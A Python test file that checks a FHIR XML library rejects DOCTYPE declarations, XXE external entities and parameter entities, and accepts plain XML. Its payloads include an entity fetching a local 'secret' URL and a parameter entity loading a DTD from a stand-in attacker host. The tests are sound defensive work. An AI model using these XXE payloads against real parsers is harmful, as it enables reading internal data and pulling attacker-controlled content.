import pytest  # optional, but we write assert-based runner so standard python works
from fhir_lite import from_xml, xml_to_json, safe_fromstring


def test_xml_security_hardening():
    # 1. Reject DOCTYPE declarations
    malicious_doctype = """<?xml version="1.0"?>
    <!DOCTYPE Patient [
      <!ELEMENT Patient ANY >
      <!ENTITY xxe "malicious_content" >
    ]>
    <Patient xmlns="http://hl7.org/fhir">
      <id value="&xxe;"/>
    </Patient>"""

    try:
        from_xml(malicious_doctype)
        assert False, "Should have rejected XML with DOCTYPE"
    except ValueError as err:
        assert "forbidden" in str(err).lower()

    try:
        xml_to_json(malicious_doctype)
        assert False, "xml_to_json should have rejected XML with DOCTYPE"
    except ValueError as err:
        assert "forbidden" in str(err).lower()

    # 2. Reject external entity declarations (XXE)
    xxe_payload = """<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/secret"> ]>
    <Observation xmlns="http://hl7.org/fhir">
      <id value="&xxe;"/>
    </Observation>"""
    try:
        safe_fromstring(xxe_payload)
        assert False, "Should have rejected XXE payload"
    except ValueError as err:
        assert "forbidden" in str(err).lower()

    # 3. Reject parameter entity declarations
    param_payload = """<!DOCTYPE test [ <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd; ]>
    <Bundle xmlns="http://hl7.org/fhir"><type value="searchset"/></Bundle>"""
    try:
        safe_fromstring(param_payload)
        assert False, "Should have rejected parameter entity payload"
    except ValueError as err:
        assert "forbidden" in str(err).lower()

    # 4. Valid XML with normal predefined entities (&amp;, &lt;, etc.) passes
    valid_xml = '<Patient xmlns="http://hl7.org/fhir"><id value="pat-1"/><gender value="male"/></Patient>'
    elem = safe_fromstring(valid_xml)
    assert elem is not None

    print("All XML security hardening checks passed successfully!")


if __name__ == "__main__":
    test_xml_security_hardening()
